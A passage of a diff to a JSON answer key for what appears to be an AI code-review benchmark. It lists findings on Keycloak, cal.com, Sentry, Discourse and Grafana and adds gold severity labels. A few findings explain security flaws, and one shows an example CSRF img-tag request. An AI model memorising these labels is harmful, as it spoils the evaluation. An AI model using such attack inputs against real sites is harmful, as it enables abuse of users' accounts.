     "suggestionContent": "WHAT: The common-prefix/common-suffix loops compute `start` and `end` independently, so when the two matching regions overlap, `start` can exceed `value.length() - end`, and line 111 calls `value.substring(start, value.length() - end)` with begin > end. WHY: `String.substring` throws StringIndexOutOfBoundsException; this is thrown from verifySafeHtml(), which is not caught by the `catch (IOException e)` in verify(), so a message string where the unescaped/normalized value is a repeated pattern (e.g. value \"aaaaa\" sanitized to \"aaa\" → start=3, value.length()-end=2) aborts the Maven plugin with an unhandled runtime exception instead of reporting an illegal-HTML message. HOW: guard the slice, e.g. compute `int vs = Math.max(0, start); int ve = Math.max(vs, value.length() - end);` (and similarly for sanitized) or clamp start/end so `start + end <= value.length()`."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-authzclientcryptoprovider-for-authorization-client-cryptographic-operations-keycloak#kimi-01",
@@ -781,7 +881,9 @@
     "relevantLinesStart": 65,
     "relevantLinesEnd": 74,
     "suggestionContent": "WHAT: readInteger accepts constructed INTEGER tags (e.g., 0x22) because it only masks the low 5 bits of the tag byte. WHY: DER/BER requires INTEGER to be primitive; accepting constructed encodings silently parses malformed input as a valid integer, diverging from BouncyCastle's strict parser. HOW: Reject the constructed bit by checking `(tag & ASN1Encoder.CONSTRUCTED) == 0` before reading the value."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-guest-management-functionality-to-existing-bookings-cal-com#e2b-01",
@@ -796,7 +898,9 @@
     "relevantLinesStart": 137,
     "relevantLinesEnd": 137,
     "suggestionContent": "The reconstructed CalendarEvent omits the booking's persisted iCalUID. generateIcsString consequently uses booking.uid for the new REQUEST attachments, so bookings whose stored iCalUID differs receive invitations with a different identity rather than updates to the original calendar event. Carry booking.iCalUID into the event passed to the calendar updater and email sender."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "sms-workflow-reminder-retry-count-tracking-cal-com#07",
@@ -811,7 +915,9 @@
     "relevantLinesStart": 38,
     "relevantLinesEnd": 42,
     "suggestionContent": "WHAT: deleteMany filters on retryCount gt 1 but schema has no index on retryCount (only bookingUid, workflowStepId, seatReferenceId, [method,scheduled,scheduledDate]). WHY: Every cron tick runs an unindexed predicate over the whole WorkflowReminder table, forcing a full scan as the table grows. HOW: Scope the delete to indexed columns and/or add @@index([retryCount]) or [method, scheduled, retryCount]."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "database-performance-optimizations-grafana-codex#musep-01",
@@ -826,7 +932,9 @@
     "relevantLinesStart": 643,
     "relevantLinesEnd": 658,
     "suggestionContent": "WHAT: untilDoneOrCancelled stops when RowsAffected==0 instead of when fetched IDs are empty. WHY: With split fetch-then-delete, fetched IDs can vanish before delete (concurrent cleanup/insert-delete race), returning 0 affected while many rows remain, causing premature termination and under-delete beyond the documented tolerance. HOW: Return/stop on len(ids)==0 from fetch, not on affected==0."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "replays-self-serve-bulk-delete-system-sentry#07",
@@ -841,7 +949,9 @@
     "relevantLinesStart": 67,
     "relevantLinesEnd": 77,
     "suggestionContent": "The new Snuba replay lookup executes even when enable_error_context=false. Every opt-out summary request incurs an unnecessary database round trip and can now fail on Snuba availability even though it only needs recording storage. Evaluate the flag first and perform the replay lookup only when error context is enabled."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "enhance-embed-url-handling-and-validation-system-discourse-cursor#01",
@@ -856,7 +966,9 @@
     "relevantLinesStart": 17,
     "relevantLinesEnd": 17,
     "suggestionContent": "WHAT: origin check is reversed as discourseUrl.indexOf(e.origin)===-1 instead of comparing origins. WHY: any e.origin that is a substring/prefix of discourseUrl passes, letting a spoofed message drive iframe height and any future message handling. HOW: strictly compare e.origin to the expected Discourse origin."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-uptime-add-ability-to-use-queues-to-manage-parallelism-sentry#16",
@@ -871,7 +983,9 @@
     "relevantLinesStart": 137,
     "relevantLinesEnd": 173,
     "suggestionContent": "Test named/docstringed \"Test that different groups are processed concurrently\" never verifies concurrency. The body only asserts all 6 items ran and that three distinct group numbers were seen — a single worker draining one queue, or a fully serial FixedQueuePool, would satisfy both assertions. Either measure actual overlap (e.g. have result_processor block on a barrier/event until all three groups have entered, and fail on timeout) or drop the concurrency claim from the name/docstring."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-upsampling-support-upsampled-error-count-with-performance-optimizations-sentry#04",
@@ -886,7 +1000,9 @@
     "relevantLinesStart": 95,
     "relevantLinesEnd": 105,
     "suggestionContent": "`_is_error_focused_query` decides a query is errors-only with a plain substring match on `event.type:error`. It also matches negated or mixed queries such as `!event.type:error` or `event.type:error OR event.type:transaction`, so count() gets upsampled on the discover dataset even when non-error events are included. Parse the query's search filters and apply upsampling only when `event.type` is a positive equality filter with value `error` and no OR/negation is present. Alternatively, use a token-aware regex that rejects a leading `!` and OR conditions."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "async-import-of-the-appstore-packages-cal-com#02",
@@ -901,7 +1017,9 @@
     "relevantLinesStart": 125,
     "relevantLinesEnd": 134,
     "suggestionContent": "bookingRefsFiltered.forEach(async (bookingRef) => {...}) runs the async getCalendar/deleteEvent callbacks in the background; the surrounding try/catch cannot catch their errors and the function may return before cleanup finishes. Convert to a for...of loop with await or Promise.all over an array of promises."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "oauth-credential-sync-and-app-integration-enhancements-cal-com#13",
@@ -916,7 +1034,9 @@
     "relevantLinesStart": 75,
     "relevantLinesEnd": 99,
     "suggestionContent": "`getClient` now unconditionally POSTs to the Salesforce token endpoint and writes to the DB every time a SalesforceCalendarService is constructed, with no expiry check. That adds an external round trip and a DB update to every booking or calendar operation and can hit Salesforce rate limits. Fix: refresh only when the token is expired, or rely on jsforce's built-in refresh."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "enhance-embed-url-handling-and-validation-system-discourse-cursor#30",
@@ -931,12 +1051,14 @@
     "relevantLinesStart": 40,
     "relevantLinesEnd": 42,
     "suggestionContent": "WHAT: `perform_retrieve` calls `Jobs::PollFeed.new.execute({})`, whose `poll_feed` loops over every `rss.items` entry with no early exit after the requested `embed_url` is imported. WHY: A single embed request for an unknown URL synchronously re-imports the whole feed (each item runs `TopicEmbed.import` → DB lookups / topic+post creation), so a feed with N items produces O(N) heavy writes per embed view, even when the desired item is the first one. HOW: Let `poll_feed` break out of the loop once `TopicEmbed.where(embed_url: @embed_url).exists?`, or pass the target embed_url into the job so it only processes matching items."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak#musep-01",
    "caseId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak",
-   "severity": "medium",
+   "severity": "low",
    "classReviewed": "TP",
    "category": "perf",
    "label": "performance",
@@ -946,7 +1068,9 @@
     "relevantLinesStart": 176,
     "relevantLinesEnd": 180,
     "suggestionContent": "WHAT: getSubGroups removed the canViewGlobal short-circuit and now calls auth.groups()::canView per subgroup (V2 does resource lookup + evaluatePermission each). WHY: For global viewers/all-groups grantees this turns one evaluation into N evaluations per page of subgroups, hot-path fanout on group listing. HOW: Restore the canViewGlobal fast path before per-group filtering."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "span-buffer-multiprocess-enhancement-with-health-monitoring-sentry#01",
@@ -961,7 +1085,9 @@
     "relevantLinesStart": 199,
     "relevantLinesEnd": 199,
     "suggestionContent": "The wait_produce metric uses tag name 'shards' while the surrounding produce and segment_size_bytes metrics use 'shard'. This inconsistency breaks dashboards/alerts that query by a single 'shard' tag because wait_produce values will not match. Change the tag key to 'shard' to match the other flusher metrics."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-2fa-backup-codes-cal-com#sncc-01",
@@ -976,7 +1102,9 @@
     "relevantLinesStart": 143,
     "relevantLinesEnd": 145,
     "suggestionContent": "The user-supplied backup code is compared with the stored secrets through Array.indexOf, which is a short-circuiting string comparison and is not constant-time. This leaks timing information about the secret codes. Compare each stored code with crypto.timingSafeEqual on equal-length buffers and go through the whole list without exiting early."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-automatically-downsize-large-images-discourse-cursor#04",
@@ -991,7 +1119,9 @@
     "relevantLinesStart": 64,
     "relevantLinesEnd": 70,
     "suggestionContent": "WHAT: The new auto-downsize call passes a tempfile path whose name has no `.GIF` extension, so `optimize` never selects the animated branch (`method_name += \"_animated\" if opts[:allow_animation] && from =~ /\\.GIF$/i`) and uses `downsize_instructions`, which runs `convert from[0]` and keeps only the first frame. WHY: Animated GIFs larger than max_image_size_kb that are uploaded through this path have their animation flattened to a single frame even though SiteSetting.allow_animated_thumbnails is enabled. HOW: Detect the image type from the original filename/content-type rather than the tempfile path (or pass a flag) so the gifsicle animated downsize path is used for GIF inputs."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-caching-support-for-identityproviderstorageprovider-getforlogin-operations-keycloak#14",
@@ -1006,7 +1136,9 @@
     "relevantLinesStart": 401,
     "relevantLinesEnd": 414,
     "suggestionContent": "Consume and assert the results of getForLogin, including a repeat query for the same mode/organization to exercise a cache hit. All calls in this test discard the returned stream and assert only IdentityProviderListQuery contents. The implementation populates that query before reconstructing the returned models, so returning an empty stream (or the wrong providers) at line 254 would still pass the entire test. Assert the expected provider identities on both the initial query and the cached query, rather than only the internal cached count."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com#sncc-01",
@@ -1021,7 +1153,9 @@
     "relevantLinesStart": 449,
     "relevantLinesEnd": 461,
     "suggestionContent": "The recurring-delete branch now sits inside a loop over every calendar reference. Each iteration repeats the delete of all remaining bookings' calendar events across all credentials. Calendar events are deleted multiple times, giving N-times duplicate API calls and 404 errors with more than one calendar reference. Run the recurring delete once, outside the per-reference loop."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-can-edit-category-host-relationships-for-embedding-discourse-cursor#09",
@@ -1036,7 +1170,9 @@
     "relevantLinesStart": 1403,
     "relevantLinesEnd": 1405,
     "suggestionContent": "This example is named \"is false if embeddable_host is blank\" but its setup (`SiteSetting.embeddable_hosts = nil`, removed by this PR) is gone, and the code under test no longer consults embeddable hosts: `expandable_first_post?` is now `SiteSetting.embed_truncate? && has_topic_embed?`. The body asserts only `expandable_first_post? == false`, which holds because `embed_truncate` defaults to false. The test therefore passes independently of the embeddable-host condition it names and would not fail if that behaviour were broken. Either assert the named condition (e.g. stub `has_topic_embed?` true and set `embed_truncate` true while ensuring no embeddable host / or rename the example to reflect what it now checks)."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-proper-handling-of-group-memberships-discourse-cursor#07",
@@ -1051,7 +1187,9 @@
     "relevantLinesStart": 23,
     "relevantLinesEnd": 27,
     "suggestionContent": "Persist params[:alias_level] when creating a group, just as update does. The creation form exposes aliasLevelOptions and group.asJSON sends the selected alias_level, but create saves only name and visible. A newly created group therefore retains the default alias level instead of the administrator's selection."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com#musep-01",
@@ -1066,7 +1204,9 @@
     "relevantLinesStart": 597,
     "relevantLinesEnd": 608,
     "suggestionContent": "A failed reschedule or location update in `updateAllCalendarEvents` looks like success because callers awaiting `Promise.all(result)` see zero results when `calendarReference` is still `undefined`. Return a single `success: false` result when the reference list is unavailable."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-per-topic-unsubscribe-option-in-emails-discourse-cursor#01",
@@ -1081,7 +1221,9 @@
     "relevantLinesStart": 440,
     "relevantLinesEnd": 441,
     "suggestionContent": "The GET routes for topics#unsubscribe change server state (the user's notification level) with no CSRF token or signed key, and Rails CSRF protection does not apply to GET requests. Any third-party page or email can embed `<img src=\"/t/x/123/unsubscribe\">` to silently mute or downgrade topics for a logged-in victim. Use a per-user signed token in the email URL, or show a confirmation page and apply the change with a POST/PUT request."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-uptime-add-ability-to-use-queues-to-manage-parallelism-sentry#10",
@@ -1096,13 +1238,14 @@
     "relevantLinesStart": 335,
     "relevantLinesEnd": 345,
     "suggestionContent": "close()/join() set shutdown_event, which stops the commit loop without a final commit, and then shut down the pool. Because worker.shutdown=True is set first, workers exit and leave the remaining queued items unprocessed. On rebalance or shutdown, finished offsets are never committed and queued work is dropped, which causes reprocessing or loss. Fix: in join(timeout), drain the queues (wait_until_empty), run a final get_committable_offsets/commit_function, and only then stop the commit thread and the workers."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra-conceded"
   },
   {
    "issueId": "enhance-embed-url-handling-and-validation-system-discourse-cursor#18",
    "caseId": "enhance-embed-url-handling-and-validation-system-discourse-cursor",
-   "severity": "high",
-   "severityBefore": "medium",
+   "severity": "medium",
    "classReviewed": "TP",
    "category": "bug",
    "label": "bug",
@@ -1112,7 +1255,9 @@
     "relevantLinesStart": 32,
     "relevantLinesEnd": 37,
     "suggestionContent": "WHAT: embed.post is dereferenced without a nil guard in the update branch (PostRevisor.new(post)). WHY: if the post was deleted the embed row remains so post is nil and revise! raises NoMethodError, crashing poll/retrieve and leaving content_sha1 stale. HOW: bail out or recreate when post is blank before revising."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-concurrent-group-access-to-prevent-nullpointerexception-keycloak#01",
@@ -1127,13 +1272,14 @@
     "relevantLinesStart": 272,
     "relevantLinesEnd": 275,
     "suggestionContent": "WHAT: getSubGroupsCount now returns null when the delegate is gone, violating GroupModel.getSubGroupsCount() contract documented as Never returns null. WHY: callers expecting non-null Long can NPE on unboxing or misbehave (count shown as unknown vs 0), turning a fixed NPE into a downstream null-dereference. HOW: return a non-null sentinel (e.g. 0L) or throw/handle deleted-group at caller instead of leaking null."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-comprehensive-email-validation-for-blocked-users-discourse-cursor#04",
    "caseId": "add-comprehensive-email-validation-for-blocked-users-discourse-cursor",
    "severity": "high",
-   "severityBefore": "medium",
    "classReviewed": "TP",
    "category": "security",
    "label": "security",
@@ -1143,7 +1289,9 @@
     "relevantLinesStart": 12,
     "relevantLinesEnd": 12,
     "suggestionContent": "The blocking lookup compares the raw email string without normalizing domain capitalization. User.new_from_params assigns params[:email] unchanged, so an address blocked as bad@example.com can sign up as bad@EXAMPLE.COM even though it routes to the same mailbox. Normalize email domains consistently when storing blocked addresses and when looking them up, using the existing Email.downcase behavior."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "replays-self-serve-bulk-delete-system-sentry#opa-01",
@@ -1158,12 +1306,14 @@
     "relevantLinesStart": 84,
     "relevantLinesEnd": 94,
     "suggestionContent": "WHAT: Every paginated GET now runs query_replay_instance and then a nodestore get_multi over all of the replay's error_ids, with no cap and before pagination. WHY: a replay with many errors loads every full event payload from nodestore on every page request, which adds large latency and memory use to a request that already calls Seer. HOW: cap error_ids (e.g. error_ids[:N]) before calling fetch_error_details."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "plugins-chore-renamed-instrumentation-middleware-to-metrics-middleware-grafana-codex#03",
    "caseId": "plugins-chore-renamed-instrumentation-middleware-to-metrics-middleware-grafana-codex",
-   "severity": "medium",
+   "severity": "low",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -1173,7 +1323,9 @@
     "relevantLinesStart": 46,
     "relevantLinesEnd": 48,
     "suggestionContent": "WHAT: TestLogger.FromContext ignores the receiver and returns a fresh NewTestLogger(). WHY: Calls like m.logger.FromContext(ctx).Info in LoggerMiddleware record on a throwaway logger, so assertions on the injected fake see zero calls and context/state is lost unlike the real wrapper which derives from the receiver. HOW: Return the receiver (or a derived copy sharing its capture) instead of a new instance."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-upsampling-support-upsampled-error-count-with-performance-optimizations-sentry#18",
@@ -1188,13 +1340,14 @@
     "relevantLinesStart": 51,
     "relevantLinesEnd": 52,
     "suggestionContent": "The 'no project IDs provided' case does not exercise the `if not project_ids: return False` guard. mock_options.get.return_value was set to [] just above (line 48), so removing the project_ids guard still returns False via the `if not allowlist` branch, and this assertion passes either way. Re-mock options.get to return a non-empty allowlist (e.g. self.project_ids) before calling with project_ids=[], so the empty-project guard is actually falsifiable."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-can-edit-category-host-relationships-for-embedding-discourse-cursor#03",
    "caseId": "feature-can-edit-category-host-relationships-for-embedding-discourse-cursor",
-   "severity": "high",
-   "severityBefore": "medium",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -1204,7 +1357,9 @@
     "relevantLinesStart": 10,
     "relevantLinesEnd": 18,
     "suggestionContent": "record_for_host lowercases the database column but does not lowercase the URI host extracted from the referer. A referer with uppercase letters (e.g. 'http://EvilTrout.com') will fail to match a lowercase stored host. Downcase the extracted host before comparing."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak#sncc-02",
@@ -1219,7 +1374,9 @@
     "relevantLinesStart": 105,
     "relevantLinesEnd": 128,
     "suggestionContent": "getGroupIdsWithViewPermission performs an authorization evaluation for every group resource. WHAT: findByType iterates all group resources and runs hasPermission for each. WHY: User search and group listing become O(N) in the number of groups with an authz evaluation per group, which is a material slowdown for realms with many groups. HOW: Use a single permission evaluation against the resource type or cache the granted group set per request."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-proper-handling-of-group-memberships-discourse-cursor#opa-01",
@@ -1234,7 +1391,9 @@
     "relevantLinesStart": 65,
     "relevantLinesEnd": 82,
     "suggestionContent": "WHAT: add_members adds every supplied username without checking whether the user is already a group member or whether the same username appears twice. WHY: Group#add pushes onto the has_many :through association, creating a GroupUser join record; the unique DB index on (group_id, user_id) then raises ActiveRecord::RecordNotUnique on duplicates instead of succeeding idempotently, and the per-username loop lacks a transaction so a mid-loop failure can leave partial membership state. HOW: Skip users already in group.user_ids and wrap the additions in a transaction."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "notification-rule-processing-engine-grafana-codex#04",
@@ -1249,7 +1408,9 @@
     "relevantLinesStart": 242,
     "relevantLinesEnd": 245,
     "suggestionContent": "WHAT: `isFederated` was hardcoded to `false` (with a TODO) replacing the previous `isFederatedRuleGroup(rule.group)`, so `immutableRule = isProvisioned || isFederated || isPluginProvided` no longer accounts for federated rule groups. WHY: useAllRulerRuleAbilities now also backs the deprecated useAllAlertRuleAbilities / all useAlertRuleAbility call sites, so federated (Mimir) rules lose their immutability guard and get Update/Delete/Pause abilities that Grafana cannot actually perform, surfacing action buttons that error on click. HOW: preserve federated detection — pass the group/CombinedRule (or its group) into useAllRulerRuleAbilities and keep `isFederatedRuleGroup(...)` in the immutable calculation."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-uptime-add-ability-to-use-queues-to-manage-parallelism-sentry#sncc-02",
@@ -1264,7 +1425,9 @@
     "relevantLinesStart": 1861,
     "relevantLinesEnd": 1870,
     "suggestionContent": "The wait loop breaks as soon as any commit is recorded, but the test then asserts the committed offset is exactly 105. A commit fired by the 1s loop mid-processing can commit a lower offset, so the test is flaky. Wait until the committed value reaches 105 before asserting."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "span-buffer-multiprocess-enhancement-with-health-monitoring-sentry#02",
@@ -1279,12 +1442,14 @@
     "relevantLinesStart": 57,
     "relevantLinesEnd": 64,
     "suggestionContent": "The added `time.sleep(0.1)` is a no-op because `time.sleep` is monkeypatched to `lambda _: None` at the top of the test. `step.join()` sets `stopped` immediately, so the flusher thread can exit before it flushes the drifted segment, and `(msg,) = messages` is racy. Fix: wait with a real polling loop on `messages`, using a saved reference to the original `time.sleep`, before calling `join()`."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "enhance-embed-url-handling-and-validation-system-discourse-cursor#musep-01",
    "caseId": "enhance-embed-url-handling-and-validation-system-discourse-cursor",
-   "severity": "medium",
+   "severity": "high",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -1294,7 +1459,9 @@
     "relevantLinesStart": 48,
     "relevantLinesEnd": 48,
     "suggestionContent": "A slow or huge embed URL hangs the job worker and starves the queue. Read `url` via `URI.open` with `open_timeout`, `read_timeout`, and a `read` size limit instead of unbounded `open`."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-per-topic-unsubscribe-option-in-emails-discourse-cursor#oph-01",
@@ -1309,7 +1476,9 @@
     "relevantLinesStart": 107,
     "relevantLinesEnd": 111,
     "suggestionContent": "Unsubscribe is a toggle-down rather than an idempotent action: a first visit takes watching/tracking down to regular, and a second visit to the same link (a reload, or an email link scanner prefetching it) mutes the topic. One email link therefore lands on different states depending on how many times it was opened, and watchers keep getting regular-level notifications after the first click even though the page says they will stop."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-client-resource-type-and-scopes-to-authorization-schema-keycloak#11",
@@ -1324,7 +1493,9 @@
     "relevantLinesStart": 147,
     "relevantLinesEnd": 152,
     "suggestionContent": "The expected ForbiddenException can come from getDefaultClientScopes(), before removeDefaultClientScope() is invoked. With no permission granted, the initial read is forbidden, so this test still passes if removal's manage-permission check is removed entirely; the later granted removal also succeeds in that broken implementation. Obtain the scope ID using the privileged realm client outside this try block, then invoke only removeDefaultClientScope() through the restricted client and assert that it is forbidden."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-client-resource-type-and-scopes-to-authorization-schema-keycloak#04",
@@ -1339,13 +1510,14 @@
     "relevantLinesStart": 215,
     "relevantLinesEnd": 221,
     "suggestionContent": "WHAT: Fallback path does not null-check getResourceTypeResource before findByResource. WHY: getResourceTypeResource returns null when the Clients type resource is missing, so findByResource(server, null) throws NPE; the sibling hasPermission(String) overload correctly returns false on null. HOW: Add if (resource == null) return false before the findByResource check."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "notification-rule-processing-engine-grafana-codex#07",
    "caseId": "notification-rule-processing-engine-grafana-codex",
-   "severity": "low",
-   "severityBefore": "medium",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -1355,7 +1527,9 @@
     "relevantLinesStart": 156,
     "relevantLinesEnd": 162,
     "suggestionContent": "WHAT: The grafana branch of the rules.map lost its `key` prop — the diff removed `key={key}` from the rendered element, while the sibling `datasource` and `default` branches still pass `key={key}`. WHY: These elements are returned from an array map, so React falls back to index-based keys and logs a \"missing key\" warning; on filter/page updates items can be reused against the wrong rule state (stale DOM/state) because the stable artificial key that `KeyedRuleWithOrigin.key` was created for is no longer supplied. HOW: restore `key={key}` on the `<GrafanaRuleListItem ... />` element."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-can-edit-category-host-relationships-for-embedding-discourse-cursor#10",
@@ -1370,7 +1544,9 @@
     "relevantLinesStart": 109,
     "relevantLinesEnd": 121,
     "suggestionContent": "Test requests fruit id 2 but pretender returns fruits[0] unconditionally, so assertions on colors [1,2] never cover fruit 2's color_ids [3]. Make pretender honor :id or request id 1 / assert single-element case to actually verify plural _ids hydration."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "anonymous-add-configurable-device-limit-grafana-codex#09",
@@ -1385,7 +1561,9 @@
     "relevantLinesStart": 44,
     "relevantLinesEnd": 50,
     "suggestionContent": "Device tagging moved from a background goroutine (with a 2-minute timeout and panic recovery) to a synchronous call on the authentication path. When anonymousDeviceLimit > 0, every uncached anonymous authentication now performs an extra CountDevices query (database.go:110) plus the CreateOrUpdateDevice upsert before the request can proceed, adding blocking DB round-trips to the auth hot path for each new device. Consider keeping the tagging asynchronous (or caching/rate-limiting the count) so anonymous request latency is not coupled to device bookkeeping."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-guest-management-functionality-to-existing-bookings-cal-com#04",
@@ -1400,7 +1578,9 @@
     "relevantLinesStart": 92,
     "relevantLinesEnd": 106,
     "suggestionContent": "Check-then-insert race: the handler reads `booking.attendees` at the start, filters against it, then inserts in a separate `prisma.booking.update ... createMany` with no transaction or unique guard. Two concurrent addGuests calls for the same guest both see it as absent and both insert, producing duplicate attendees. Wrap the read+filter+insert in a transaction (or rely on a unique constraint on (bookingId, email) and handle the conflict) so concurrent requests cannot both succeed."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "replays-self-serve-bulk-delete-system-sentry#01",
@@ -1415,13 +1595,14 @@
     "relevantLinesStart": 50,
     "relevantLinesEnd": 60,
     "suggestionContent": "The `validate_timestamp` and `validate_age` methods check for the other field with `self.initial_data.get(...)`, which is truthy-based. A report containing `timestamp: 0` and `age: 1` (or `age: 0` and `timestamp: 1`) passes validation even though both fields are present, violating the spec's mutual-exclusivity rule. Use `\"age\" in self.initial_data` and `\"timestamp\" in self.initial_data` instead."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "scale-color-lightness-must-use-secondary-for-dark-themes-discourse-cursor#01",
    "caseId": "scale-color-lightness-must-use-secondary-for-dark-themes-discourse-cursor",
    "severity": "low",
-   "severityBefore": "medium",
    "classReviewed": "FP nit",
    "category": "style",
    "label": "bug",
@@ -1431,7 +1612,9 @@
     "relevantLinesStart": 291,
     "relevantLinesEnd": 291,
     "suggestionContent": "The light-theme argument of `dark-light-choose` uses lightness 70% instead of the original 30%. This changes `.topic-meta-data h5 a` in light themes from a slightly lightened primary to a much lighter gray, contradicting the PR's stated intent to only fix dark themes. Change to `dark-light-choose(scale-color($primary, $lightness: 30%), scale-color($secondary, $lightness: 70%))`."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-comprehensive-email-validation-for-blocked-users-discourse-cursor#02",
@@ -1446,13 +1629,14 @@
     "relevantLinesStart": 69,
     "relevantLinesEnd": 74,
     "suggestionContent": "The message shown for a rejected email disagrees with the reason the code is reacting to. This branch fires when the server rejected the email (result.errors.email), and this PR gives that condition its own server string — user.email.blocked, added in config/locales/server.en.yml as \"is not allowed.\" — but the client re-labels it with the generic I18n.t('user.email.invalid'). A user whose address is perfectly well-formed but blocked/hosted on a blacklisted domain is therefore told their email is invalid, contradicting the reason just returned by the server. Use the blocked/not-allowed message (and add a matching client locale key) instead of user.email.invalid. Notice the same generic string is used at line ~94 for validation failures, so it should not be reused to represent a distinct server-side rejection."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "advanced-date-override-handling-and-timezone-compatibility-improvements-cal-com#oph-02",
    "caseId": "advanced-date-override-handling-and-timezone-compatibility-improvements-cal-com",
    "severity": "high",
-   "severityBefore": "medium",
    "classReviewed": "TP",
    "category": "bug",
    "label": "bug",
@@ -1462,7 +1646,9 @@
     "relevantLinesStart": 110,
     "relevantLinesEnd": 111,
     "suggestionContent": "WHAT: The override date is formatted with `dayjs(...)`, which uses the server's local timezone, while the slot date is formatted in UTC. WHY: On a server not running in UTC, the day comparison is off for overrides near midnight, so overrides get applied to the wrong day or skipped. HOW: Use dayjs.utc(date.start) before adding the offset and formatting."
-   }
+   },
+   "severityGold": "high",
+   "labelBy": "astra-conceded"
   },
   {
    "issueId": "fix-proper-handling-of-group-memberships-discourse-cursor#12",
@@ -1477,13 +1663,14 @@
     "relevantLinesStart": 114,
     "relevantLinesEnd": 117,
     "suggestionContent": "The remove_member automatic-group test sends xhr :put, but config/routes.rb maps remove_member to a DELETE route, so the test does not exercise the endpoint and will fail with a routing error. Change xhr :put to xhr :delete."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "advanced-date-override-handling-and-timezone-compatibility-improvements-cal-com#oph-01",
    "caseId": "advanced-date-override-handling-and-timezone-compatibility-improvements-cal-com",
    "severity": "high",
-   "severityBefore": "medium",
    "classReviewed": "TP",
    "category": "bug",
    "label": "bug",
@@ -1493,7 +1680,9 @@
     "relevantLinesStart": 117,
     "relevantLinesEnd": 122,
     "suggestionContent": "WHAT: The start-bound check only rejects slots that end at or before the override start; it never checks whether the slot starts before the override. WHY: A slot that begins before the override window and ends inside it is treated as available, so fixed hosts can be booked partly outside their override hours. HOW: Reject the slot when slotStartTime is before the override start."
-   }
+   },
+   "severityGold": "high",
